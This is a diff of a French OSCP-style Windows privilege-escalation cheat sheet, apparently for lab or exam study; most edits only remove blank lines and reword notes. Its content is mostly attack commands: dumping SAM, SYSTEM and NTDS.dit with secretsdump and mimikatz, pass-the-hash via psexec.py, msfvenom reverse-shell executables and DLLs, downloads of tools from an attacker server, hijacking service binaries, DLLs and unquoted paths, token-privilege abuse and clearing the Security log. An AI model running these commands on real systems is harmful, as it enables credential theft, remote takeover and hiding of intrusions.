@@ -7,12 +7,9 @@ description: "Auditer les services, jetons et configurations d'un poste Windows.
 
 Auditer les services, jetons et configurations d'un poste Windows.
 
-
 ## Énumération
 
-
 **Utilisateur et nom de la machine**
-
 
 <p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Énumération».</p>
 
@@ -20,7 +17,6 @@ Auditer les services, jetons et configurations d'un poste Windows.
 whoami
 
 ```
-
 
 **Utilisateurs locaux**
 
@@ -31,9 +27,6 @@ Get-LocalUser
 
 ```
 
-
-
-
 **Groupes locaux**
 
 <p class="oscp-command-note">Lister les groupes locaux de Windows.</p>
@@ -43,16 +36,12 @@ Get-LocalGroup
 
 ```
 
-
-
-
 <p class="oscp-command-note">Lister les groupes locaux Windows.</p>
 
 ```powershell
 net localgroup
 
 ```
-
 
 <p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>
 
@@ -61,9 +50,7 @@ Get-LocalGroupMember -GroupName [GroupName]
 
 ```
 
-
 **Système, version et architecture**
-
 
 <p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>
 
@@ -72,9 +59,7 @@ systeminfo
 
 ```
 
-
 **Configuration réseau**
-
 
 <p class="oscp-command-note">Afficher la configuration réseau Windows.</p>
 
@@ -83,14 +68,12 @@ ipconfig /all
 
 ```
 
-
 <p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>
 
 ```powershell
 route print
 
 ```
-
 
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
@@ -99,9 +82,7 @@ netstat -ano
 
 ```
 
-
 **Logiciels installés**
-
 
 <p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>
 
@@ -110,14 +91,12 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVers
 
 ```
 
-
 <p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
 ```powershell
 Select-Object -Property DisplayName
 
 ```
-
 
 <p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>
 
@@ -126,14 +105,12 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstal
 
 ```
 
-
 <p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>
 
 ```powershell
 Select-Object -Property DisplayName
 
 ```
-
 
 **Processus actifs**
 
@@ -144,11 +121,7 @@ Get-Process | Select-Object -Property ProcessName, Path
 
 ```
 
-
-
-
 **Comptes de service**
-
 
 <p class="oscp-command-note">Examiner les informations système WMI.</p>
 
@@ -157,9 +130,7 @@ Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
 
 ```
 
-
 **Tâches planifiées**
-
 
 <p class="oscp-command-note">Lister les tâches planifiées Windows.</p>
 
@@ -168,9 +139,7 @@ Get-ScheduledTask | Select-Object TaskName, TaskPath, State
 
 ```
 
-
 **Membres du groupe Administrateurs**
-
 
 <p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>
 
@@ -179,9 +148,7 @@ Get-LocalGroupMember -GroupName "Administrators"
 
 ```
 
-
 **Lecteurs et volumes**
-
 
 <p class="oscp-command-note">Lister les lecteurs PowerShell.</p>
 
@@ -190,18 +157,12 @@ Get-PSDrive -PSProvider FileSystem
 
 ```
 
-
 **Version de PowerShell**
-
-
-
 
 ```text
 $PSVersionTable.PSVersion
 
 ```
-
-
 
 ### Utilisateurs, groupes et privilèges Windows
 
@@ -237,7 +198,6 @@ Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
 Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 ```
 
-
 ### RunasCs avec identifiants de laboratoire
 
 Démarrer uniquement une commande d'identification sous le compte de test fourni. RunasCs requiert des identifiants valides et sa syntaxe diffère de celle de `runas.exe`. [Référence officielle](https://github.com/antonioCoco/RunasCs).
@@ -250,7 +210,6 @@ RunasCs.exe <UTILISATEUR> <MOT_DE_PASSE> 'cmd /c whoami /all'
 
 ## Recherche de fichiers
 
-
 <p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>
 
 ```powershell
@@ -260,13 +219,11 @@ Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyC
 
 ```
 
-
 ```powershell
 # Rechercher les bases KeePass (.kdbx)
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
 ```
-
 
 ```powershell
 # Rechercher les fichiers de configuration XAMPP
@@ -274,13 +231,11 @@ Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction Si
 
 ```
 
-
 ```powershell
 # Rechercher les sauvegardes et fichiers temporaires
 Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
 
 ```
-
 
 ```powershell
 # Rechercher les fichiers correspondant au filtre
@@ -290,20 +245,17 @@ Get-ChildItem -Path [Path] -File -Recurse | Where-Object {
 
 ```
 
-
 ```powershell
 # Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length
 
 ```
 
-
 ```powershell
 # Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
 
 ```
-
 
 ```powershell
 # Rechercher les fichiers correspondant au filtre
@@ -313,20 +265,14 @@ Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
 
 ```
 
-
 **Paramètres et repères :**
 `Runas`  
-
-
-
 
 ```powershell
 # Remplacer [Domain\Username] par le nom d'utilisateur cible (par exemple, backupadmin). Vous serez invité à saisir le mot de passe de l'utilisateur spécifié.
 runas /user:[Domain\Username] cmd
 
 ```
-
-
 
 ### Fichiers de configuration et coffres
 
@@ -338,7 +284,6 @@ Rechercher des extensions précises sans ouvrir automatiquement les fichiers dé
 Get-ChildItem -Path 'C:\Users' -Recurse -File -Include '*.config','*.ini','*.xml' -ErrorAction SilentlyContinue
 Get-ChildItem -Path 'C:\Users' -Recurse -File -Filter '*.kdbx' -ErrorAction SilentlyContinue
 ```
-
 
 ### Inspecter les éléments de la Corbeille
 
@@ -354,18 +299,13 @@ Lister les entrées de la Corbeille visibles par le compte Windows courant, sans
 
 Observer les permissions et la configuration de Windows.
 
-
 **Paramètres et repères :**
 `Get-History`  
-
-
-
 
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
 
 ```
-
 
 ```powershell
 $userProfiles = Get-ChildItem -Path C:\Users -Directory
@@ -384,9 +324,7 @@ foreach ($profile in $userProfiles) {
 
 ```
 
-
 ### Vérifier les privilèges
-
 
 <p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifier les privilèges».</p>
 
@@ -395,18 +333,13 @@ whoami /priv
 
 ```
 
-
 ### Activer tous les jetons
-
-
-
 
 ```powershell
 .\EnableAllTokenPrivs.ps1
 whoami /priv
 
 ```
-
 
 <p class="oscp-command-note">Définir les appels C# utilisés pour gérer les privilèges PowerShell.</p>
 
@@ -484,73 +417,49 @@ $type[0]::EnablePrivilege() 2>&1
 
 ```
 
-
 ### Tableau des privilèges
-
 
 **Paramètres et repères :**
 `SeAssignPrimaryToken`  
 
-
 **SeAssignPrimaryToken**
-
 
 **Paramètres et repères :**
 `SeAudit`  
 
-
 **SeAudit**
-
-
-
 
 ```text
 Authz Report Security Event
 
 ```
 
-
 **Paramètres et repères :**
 `SeBackup`  
 
-
 **SeBackup**
-
-
-
 
 ```text
 HKLM\SAM
 
 ```
 
-
 <p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>
-
 
 **Paramètres et repères :**
 `SAM` · `Administrators` · `SeBackupPrivilege`  
 
-
 **Paramètres et repères :**
 `SeBackup` · `SeRestore`  
 
-
 **SeBackup**
-
-
-
 
 ```text
 HKLM\SAM
 
 ```
 
-
 <p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>
-
-
-
 
 <p class="oscp-command-note">Sauvegarder les ruches du Registre pour l'analyse autorisée.</p>
 
@@ -559,10 +468,8 @@ cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
 
 ```
 
-
 **Paramètres et repères :**
 `SAM` · `Impacket` · `secretsdump.py`  
-
 
 <p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Tableau des privilèges» (ne pas exécuter comme une commande).</p>
 
@@ -571,11 +478,9 @@ secretsdump.py -sam SAM -system SYSTEM LOCAL
 
 ```
 
-
 **Paramètres et repères :**
 `Administrator` · `Administrators` · `NTLM` · `Impacket`  
 `psexec.py`  
-
 
 <p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
@@ -584,9 +489,6 @@ psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
 
 ```
 
-
-
-
 <p class="oscp-command-note">Copier des fichiers avec Robocopy et les options de sauvegarde.</p>
 
 ```powershell
@@ -594,39 +496,23 @@ robocopy /b
 
 ```
 
-
-
-
 <p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>User Account Control</code></p>
-
 
 **Paramètres et repères :**
 `Administrator` · `FilterAdministratorToken` · `SMB` · `NetBIOS`  
 `WinRM` · `RDP`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Restricted Admin</code></p>
 
-
-
-
 <p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>%WINDIR%\MEMORY.DMP</code></p>
-
 
 **Paramètres et repères :**
 `SeBackupPrivilege` · `SeBackup` · `SeRestore` · `/b`  
 
-
-
-
 <p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Backup Operators</code></p>
-
 
 **Paramètres et repères :**
 `Copy-FileSeBackupPrivilege` · `SeBackup`  
-
 
 <p class="oscp-command-note">Charger un module PowerShell.</p>
 
@@ -635,18 +521,13 @@ Import-Module .\SeBackupPrivilegeUtils.dll
 
 ```
 
-
 ```powershell
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 ```
 
-
 **Paramètres et repères :**
 `Set-SeBackupPrivilege`  
-
-
-
 
 <p class="oscp-command-note">Copier le fichier avec les droits SeBackupPrivilege disponibles.</p>
 
@@ -655,215 +536,151 @@ Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
 
 ```
 
-
 **Paramètres et repères :**
 `SeChangeNotify`  
 
-
 **SeChangeNotify**
-
 
 **Paramètres et repères :**
 `SeCreateGlobal`  
 
-
 **SeCreateGlobal**
-
 
 **Paramètres et repères :**
 `SeCreatePagefile`  
 
-
 **SeCreatePagefile**
-
 
 **Paramètres et repères :**
 `SeCreatePermanent`  
 
-
 **SeCreatePermanent**
-
 
 **Paramètres et repères :**
 `SeCreateSymbolicLink`  
 
-
 **SeCreateSymbolicLink**
-
 
 **Paramètres et repères :**
 `SeCreateToken` · `NtCreateToken`  
 
-
 **SeCreateToken**
-
 
 **Paramètres et repères :**
 `SeDebug` · `lsass.exe`  
 
-
 **SeDebug**
-
 
 **Paramètres et repères :**
 `SeDelegateSession-` · `UserImpersonate`  
 
-
 **SeDelegateSession- UserImpersonate**
-
 
 **Paramètres et repères :**
 `SeEnableDelegation`  
 
-
 **SeEnableDelegation**
-
 
 **Paramètres et repères :**
 `SeImpersonate` · `SeAssignPrimaryToken`  
 
-
 **SeImpersonate**
-
 
 **Paramètres et repères :**
 `SeIncreaseBasePriority`  
 
-
 **SeIncreaseBasePriority**
-
-
-
 
 ```text
 start /realtime SomeCpuIntensiveApp.exe
 
 ```
 
-
 **Paramètres et repères :**
 `SeIncreaseQuota`  
 
-
 **SeIncreaseQuota**
-
 
 **Paramètres et repères :**
 `SeIncreaseWorkingSet`  
 
-
 **SeIncreaseWorkingSet**
-
 
 **Paramètres et repères :**
 `SeLoadDriver` · `szkg64.sys` · `fltMC`  
 
-
 **SeLoadDriver**
-
-
-
 
 ```text
 fltMC sysmondrv
 
 ```
 
-
 **Paramètres et repères :**
 `szkg64`  
-
 
 **Paramètres et repères :**
 `SeLockMemory`  
 
-
 **SeLockMemory**
-
 
 **Paramètres et repères :**
 `SeMachineAccount`  
 
-
 **SeMachineAccount**
-
 
 **Paramètres et repères :**
 `SeManageVolume`  
 
-
 **SeManageVolume**
-
-
-
 
 ```text
 SYNCHRONIZE | FILE_TRAVERSE
 
 ```
 
-
 **Paramètres et repères :**
 `FSCTL_SD_GLOBAL_CHANGE` · `S-1-5-32-544` · `S-1-5-32-545`  
-
 
 **Paramètres et repères :**
 `SeProfileSingleProcess`  
 
-
 **SeProfileSingleProcess**
-
 
 **Paramètres et repères :**
 `SeRelabel` · `WRITE_OWNER`  
 
-
 **SeRelabel**
-
 
 **Paramètres et repères :**
 `SeRemoteShutdown`  
 
-
 **SeRemoteShutdown**
-
-
-
 
 ```text
 shutdown /s /f /m \\server1 /d P:5:19
 
 ```
 
-
 **Paramètres et repères :**
 `SeReserveProcessor`  
 
-
 **SeReserveProcessor**
-
 
 **Paramètres et repères :**
 `SeRestore`  
 
-
 **SeRestore**
-
 
 **Paramètres et repères :**
 `SeSecurity`  
 
-
 **SeSecurity**
-
-
-
 
 ```text
 wevtutil cl Security
 
 ```
-
 
 <p class="oscp-command-note">Contrôler la configuration des journaux ou tâches Windows.</p>
 
@@ -872,57 +689,40 @@ wevtutil sl Security /ms:0
 
 ```
 
-
 **Paramètres et repères :**
 `SeShutdown`  
 
-
 **SeShutdown**
-
-
-
 
 ```text
 shutdown.exe /s /f /t 1
 
 ```
 
-
 **Paramètres et repères :**
 `SeSyncAgent`  
 
-
 **SeSyncAgent**
-
 
 **Paramètres et repères :**
 `SeSystemEnvironment` · `NtSetSystemEnvironmentValue` · `NtModifyDriverEntry`  
 
-
 **SeSystemEnvironment**
-
 
 **Paramètres et repères :**
 `SeSystemProfile`  
 
-
 **SeSystemProfile**
-
 
 **Paramètres et repères :**
 `SeSystemtime`  
 
-
 **SeSystemtime**
-
-
-
 
 ```text
 cmd.exe /c date 01-01-01
 
 ```
-
 
 <p class="oscp-command-note">CMD : modifier l'heure système (nécessite les privilèges nécessaires ; ne pas exécuter sans raison).</p>
 
@@ -931,27 +731,18 @@ cmd.exe /c time 00:00
 
 ```
 
-
 **Paramètres et repères :**
 `SeSystemTime`  
-
 
 **Paramètres et repères :**
 `SeTakeOwnership`  
 
-
 **SeTakeOwnership**
-
-
-
 
 ```text
 takeown.exe /f "%windir%\system32"
 
 ```
-
-
-
 
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Tableau des privilèges».</p>
 
@@ -960,56 +751,40 @@ icacls.exe "%windir%\system32" /grant "%username%":F
 
 ```
 
-
 **Paramètres et repères :**
 `SeTcb`  
 
-
 **SeTcb**
-
 
 **Paramètres et repères :**
 `SeTimeZone`  
 
-
 **SeTimeZone**
-
-
-
 
 ```text
 tzutil /s "Chatham Islands Standard Time"
 
 ```
 
-
 **Paramètres et repères :**
 `SeTrustedCredManAccess`  
 
-
 **SeTrustedCredManAccess**
-
 
 **Paramètres et repères :**
 `SeUndock`  
 
-
 **SeUndock**
-
 
 **Paramètres et repères :**
 `SeUnsolicitedInput`  
 
-
 **SeUnsolicitedInput**
-
 
 ### FullPowers.exe
 
-
 **Paramètres et repères :**
 `FullPowers.exe` · `SeAssignPrimaryToken` · `SeImpersonate`  
-
 
 <p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
@@ -1019,7 +794,6 @@ python3 -m http.server 80
 ```
 
 ![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)
-
 
 <p class="oscp-command-note">Windows : télécharger FullPowers.exe avec certutil ou Invoke-WebRequest.</p>
 
@@ -1034,12 +808,8 @@ Invoke-WebRequest -Uri http://[kali_ip]/FullPowers.exe -OutFile FullPowers.exe
 
 ![Downloading FullPowers.exe to victim machine.](https://www.emmanuelsolis.com/img/fullpowers_2.png)
 
-
 **Paramètres et repères :**
 `FullPowers.exe`  
-
-
-
 
 ```powershell
 # Utilisation de base
@@ -1058,10 +828,8 @@ Invoke-WebRequest -Uri http://[kali_ip]/FullPowers.exe -OutFile FullPowers.exe
 
 ![Running FullPowers.exe.](https://www.emmanuelsolis.com/img/fullpowers_3.png)
 
-
 **Paramètres et repères :**
 `FullPowers.exe`  
-
 
 <p class="oscp-command-note">Identifier le compte et les groupes visibles dans «FullPowers.exe».</p>
 
@@ -1072,24 +840,20 @@ whoami /priv
 
 ![Verifying our New Restored Privileges.](https://www.emmanuelsolis.com/img/fullpowers_4.png)
 
-
 **Paramètres et repères :**
 `SeImpersonate` · `PrintSpoofer.exe` · `GodPotato.exe`  
 
 ![Executing Malicious Actions.](https://www.emmanuelsolis.com/img/fullpowers_5.png)
 
-
 ### Vérifications principales
 
-
-<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
+<p class="oscp-command-note">Afficher les informations système avec CIM.</p>
 
 ```powershell
 # Conseil: Recherchez des services avec des chemins en dehors de `system32` ou d'autres endroits inattendus.; essayez de trouver cette chose qui semble déplacée.
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
 
 ```
-
 
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications principales».</p>
 
@@ -1098,16 +862,12 @@ icacls "C:\Path\To\ServiceBinary.exe"
 
 ```
 
-
-<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
+<p class="oscp-command-note">Afficher les informations système avec CIM.</p>
 
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
 
 ```
-
-
-
 
 <p class="oscp-command-note">Extrait C : exemple technique pour «Vérifications principales» (ce n'est pas une commande de terminal).</p>
 
@@ -1123,15 +883,11 @@ int main ()
 
 ```
 
-
-
-
 ```bash
 # Compiler le code C pour Windows 64 bits
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 ```
-
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
@@ -1144,10 +900,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -
 
 ```
 
-
 **Paramètres et repères :**
 `msfvenom`  
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -1161,27 +915,19 @@ move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
 
 ```
 
-
-
-
 ```powershell
 Restart-Service -Name '<ServiceName>'
 
 ```
 
-
 **Paramètres et repères :**
 `sc.exe`  
-
-
-
 
 ```powershell
 sc.exe stop <ServiceName>
 sc.exe start <ServiceName>
 
 ```
-
 
 <p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifications principales».</p>
 
@@ -1194,9 +940,7 @@ shutdown /r /t 0
 
 ```
 
-
 ### Vérifications complémentaires
-
 
 <p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
@@ -1205,7 +949,6 @@ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
 
 ```
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -1221,16 +964,12 @@ Install-ServiceBinary -Name '<ServiceName>'
 
 ```
 
-
-
-
 ```powershell
 $ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal
 
 ```
 
-
-<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
+<p class="oscp-command-note">Afficher les informations système avec CIM.</p>
 
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
@@ -1242,13 +981,11 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Objec
 
 ```
 
-
 ```powershell
 # Dépendances des services de la liste
 Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
 
 ```
-
 
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications complémentaires».</p>
 
@@ -1258,10 +995,8 @@ icacls "C:\Path\To\Service\ConfigFile.ini"
 
 ```
 
-
 **Paramètres et repères :**
 `impacket-tool`  
-
 
 <p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
@@ -1276,25 +1011,16 @@ flare-floss [downloaded_binary]
 
 ```
 
-
-
-
 ```powershell
 Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
 
 ```
-
-
-
 
 ```powershell
 # Vérifier les paramètres de mise à jour du système qui pourraient revenir aux modifications
 Get-WindowsUpdateLog
 
 ```
-
-
-
 
 #### Mises à jour Windows
 
@@ -1328,17 +1054,14 @@ Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hi
 
 ## Chargement de DLL par un service
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows\System32\System</code></p>
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows</code></p>
 **Paramètres et repères :**
 `PATH` · `ProcMon` · `depends.exe`  
 
-
-<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
+<p class="oscp-command-note">Afficher les informations système avec CIM.</p>
 
 ```powershell
 # Lister les services en cours d'exécution et leurs chemins exécutables
@@ -1346,21 +1069,14 @@ Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-
 
 ```
 
-
 **Paramètres et repères :**
 `PATH`  
-
-
-
 
 ```powershell
 # Affiche la variable d'environnement PATH
 $env:path
 
 ```
-
-
-
 
 <p class="oscp-command-note">Extrait C : exemple technique pour «Chargement de DLL par un service» (ce n'est pas une commande de terminal).</p>
 
@@ -1382,15 +1098,11 @@ BOOL APIENTRY DllMain(
 
 ```
 
-
-
-
 ```bash
 # Compiler la DLL pour Windows
 x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
 
 ```
-
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
@@ -1403,10 +1115,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -
 
 ```
 
-
 **Paramètres et repères :**
 `msfvenom`  
-
 
 <p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chargement de DLL par un service».</p>
 
@@ -1424,7 +1134,6 @@ Restart-Service -Name "[serviceToHijack]"
 
 ```
 
-
 <p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>
 
 ```powershell
@@ -1436,16 +1145,11 @@ net localgroup administrators
 
 ```
 
-
-
-
 ```powershell
 # Affiche la variable d'environnement PATH
 $env:path
 
 ```
-
-
 
 ### Configuration et permissions du service
 
@@ -1460,7 +1164,6 @@ icacls '<CHEMIN_EXECUTABLE>'
 
 ## Chemins de services sans guillemets
 
-
 <p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
@@ -1468,17 +1171,13 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 
 ```
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
 **Paramètres et repères :**
 `.exe`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program.exe</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp.exe</code></p>
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
@@ -1486,9 +1185,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 **Paramètres et repères :**
 `app.exe`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\ExampleApp\ExampleService.exe</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program.exe</code></p>
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Chemins de services sans guillemets».</p>
@@ -1497,7 +1194,6 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 icacls "<PathToDirectory>"
 
 ```
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -1513,7 +1209,6 @@ powershell -ep bypass
 Get-UnquotedService
 
 ```
-
 
 <p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chemins de services sans guillemets».</p>
 
@@ -1537,8 +1232,6 @@ Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -lik
 
 ```
 
-
-
 ### Lister les chemins des services
 
 Contrôler les espaces et les guillemets des chemins de services avant toute interprétation.
@@ -1551,7 +1244,6 @@ Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName | Format-T
 
 ## Tâches planifiées
 
-
 <p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>
 
 ```powershell
@@ -1559,14 +1251,12 @@ schtasks /query /fo LIST /v
 
 ```
 
-
 <p class="oscp-command-note">Examiner ou modifier les permissions selon «Tâches planifiées».</p>
 
 ```powershell
 icacls "C:\Path\To\ScheduledTaskExecutable.exe"
 
 ```
-
 
 <p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
@@ -1579,9 +1269,7 @@ move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
 
 ```
 
-
 ### Connexions réseau actives
-
 
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
@@ -1599,16 +1287,11 @@ udp    192.168.1.9:500    0.0.0.0:*                       -
 
 ```
 
-
 ## Recherche de mots de passe en clair
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 ### Utilisation de Findstr
-
-
-
 
 ```bash
 findstr /si password *.txt
@@ -1617,9 +1300,7 @@ findstr /si password *.ini
 
 ```
 
-
 ### Recherche dans les fichiers de configuration
-
 
 <p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
@@ -1628,11 +1309,7 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 
 ```
 
-
 ### Recherche dans tous les fichiers
-
-
-
 
 ```bash
 findstr /spin "password" *.*
@@ -1640,9 +1317,7 @@ findstr /spin "password" *.*
 
 ```
 
-
 ### Vérifier les fichiers spécifiques
-
 
 <p class="oscp-command-note">Chemins Windows de fichiers de configuration à rechercher, non exécutables.</p>
 
@@ -1655,9 +1330,7 @@ c:\unattend.xml
 
 ```
 
-
 ### Rechercher des fichiers de mots de passe VNC
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Rechercher des fichiers de mots de passe VNC».</p>
 
@@ -1667,8 +1340,6 @@ dir c:\*ultravnc.ini /s /b
 dir c:\ /s /b | findstr /si *vnc.ini
 
 ```
-
-
 
 ### Registre Winlogon et ouverture de session automatique
 
@@ -1692,22 +1363,17 @@ Afficher l'emplacement où PowerShell enregistre son historique pour le compte c
 
 ## Copies instantanées VSS (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
 
-
 **Paramètres et repères :**
 `Windows.Old` · `SYSTEM` · `SAM` · `NTDS.dit`  
 `SECURITY` · `NTUSER.dat`  
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\SAM</code></p>
-
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\windows.old\Windows\System32\SAM</code></p>
 **Paramètres et repères :**
 `impacket-tool`  
 
-
 ### Sauvegarder les ruches SAM et SYSTEM
-
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
@@ -1716,14 +1382,10 @@ reg save hklm\sam <destination_path>\sam
 
 ```
 
-
 ```powershell
 reg save hklm\system <destination_path>\system
 
 ```
-
-
-
 
 ```bash
 samdump2 <system_file> <sam_file>
@@ -1732,7 +1394,6 @@ impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -1740,27 +1401,19 @@ mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
 
 ```
 
-
 ### Accéder à NTDS.dit (base Active Directory)
 
 Examiner les objets, les droits et les services du domaine.
-
-
-
 
 ```powershell
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
 
 ```
 
-
-
-
 ```powershell
 reg.exe save hklm\system <destination_path>\system.bak
 
 ```
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -1769,7 +1422,6 @@ impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -1777,11 +1429,9 @@ mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
 
 ```
 
-
 ### Extraire les secrets LSA depuis la ruche SECURITY
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
-
 
 <p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>
 
@@ -1790,12 +1440,10 @@ reg save hklm\security <destination_path>\security
 
 ```
 
-
 ```powershell
 reg save hklm\system <destination_path>\system
 
 ```
-
 
